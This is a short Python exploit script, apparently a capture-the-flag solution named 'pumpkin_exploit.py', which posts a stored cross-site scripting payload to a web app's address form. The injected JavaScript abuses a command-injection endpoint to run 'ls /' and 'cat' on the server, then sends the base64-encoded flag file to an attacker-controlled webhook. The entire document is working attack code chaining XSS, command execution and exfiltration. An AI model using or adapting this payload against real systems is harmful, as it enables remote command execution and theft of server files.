import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 pumpkin_exploit.py ip:port")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/add/address"

#Please add here your webhook url
WEBHOOK_URL = ""

payload = f"""<script>(async () => {{
    let response = await fetch('/api/stats?command=ls+/');
    let flag = await response.text();
    response = await fetch('/api/stats?command=cat+/flag' + flag.split('flag')[1].substr(0, 10) + '.txt');
    flag = await response.text();
    await fetch('{WEBHOOK_URL}?c=' + btoa(flag))
}})()</script>"""

data = {"address": payload}

res = requests.post(url, data=data)
if res.status_code == 200:
    print(" Payload sent successfully. Check your webhook for the flag. And decode it as base64")
else:
    print("Failed to send payload")
